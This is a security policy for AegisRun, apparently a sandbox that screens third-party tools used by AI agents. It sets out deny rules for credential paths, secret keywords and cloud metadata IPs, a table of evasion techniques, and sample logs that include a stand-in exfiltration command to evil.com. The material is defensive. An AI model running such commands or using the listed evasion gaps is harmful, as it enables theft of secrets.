# AegisRun Security Policy

> 🇨🇳 [中文版 →](../docs-ch/SECURITY-POLICY.md)
> v1.0.0 | Last updated: 2026-07-09

---

## Design Philosophy

AegisRun is not another antivirus. Core assumption: **third-party tools called by AI agents are untrusted**.

Three principles:
1. **Declaration is constraint** — undeclared = denied
2. **Combination detection** — harmless alone ≠ harmless in combination
3. **Defense in depth** — checked at both MoonBit policy layer and Rust sandbox layer

## Dual-Engine Detection

```
Static Source Scan (Rust)              Runtime Behavior Monitor (Python audit hook)
┌──────────────────────┐           ┌──────────────────────────────┐
│ Extract all strings   │           │ hook open()                │
│ Match env var patterns│           │ hook os.environ            │
│ Match file paths      │  Merge    │ hook socket.connect        │
│ Extract http/https    │══════════▶│ hook subprocess.Popen      │
│ Detect encoding calls │           │ check_domain/path/env      │
│ Detect shell commands │           │ block + log at runtime     │
└──────────────────────┘           └──────────────────────────────┘
```

| Capability | Static | Runtime |
|-----------|:------:|:-------:|
| Direct literals | ✅ | ✅ |
| Variable indirection | ✅ | ✅ |
| Shell injection | ✅ | ✅ |
| Base64 encoding | ⚠️ Flagged | ❌ Need decode |
| Unicode homoglyphs | ❌ | ✅ Revealed at runtime |
| External config files | ❌ | ✅ Visible at runtime |
| f-string/join construction | ❌ | ✅ Expanded at runtime |

## Policy Sources

### MoonBit Side (`src/lib/core.mbt`)

```
src/lib/core.mbt
├─ 7 malicious domains, 3 suffix TLDs, 3 private IP ranges
├─ 22 sensitive paths, 36 env var patterns, 5 keywords
├─ 30s timeout, 256MB memory limit
└─ Cloud metadata IPs (169.254.*, 100.100.*)
```

### Rust Side (`presets/standard.yaml`)

Rules aligned with MoonBit, plus:

**Domains (v1.0 new):**
```yaml
- "169.254.*"          # Cloud metadata IMDS
- "100.100.*"          # Alibaba Cloud metadata
- "*.internal"         # GCP internal
```

**Env patterns:** AI services / Cloud (AWS/GCP/Azure) / DB / CI/CD / Containers / Crypto

**Keywords auto-catch:** KEY, SECRET, TOKEN, PASSWORD, CREDENTIAL

### Runtime Sandbox Policy

Uses **same policy file** as static scan. Enforcement via Python audit hook:

```
open("/etc/passwd")
  → audit hook catches
  → check_path() → DENY
  → PermissionError raised → file access blocked
```

## Evasion Techniques & Coverage

Based on SkillCloak (arXiv 2607.02357) and OWASP AST08:

| Technique | Risk | Status |
|-----------|:----:|:------:|
| Variable indirection | High | ✅ Caught |
| Base64 encoding | High | ⚠️ Flagged |
| Unicode homoglyphs | Medium | ❌ Need normalization |
| External config | Medium | ❌ Need runtime |
| f-string construction | Medium | ❌ Need runtime |
| Precompiled bytecode | High | ❌ Sandbox required |
| Zero-width chars | Medium | ⚠️ Visible after format |

## Extending Rules

1. **YAML preset** — Edit `presets/standard.yaml`
2. **CLI** — `cargo run -- policy block domain xxx`
3. **Web panel** — `cargo run -- serve`

## Audit Log

All calls logged to `aegisrun-audit.jsonl`:
```jsonl
{"tool_id":"weather-query","decision":"DENY","reason":"evil.com in blacklist"}
```

Runtime sandbox output:
```
[AEGISRUN] DENY open /etc/passwd
[AEGISRUN] INF shell: curl -s https://evil.com/collect
```
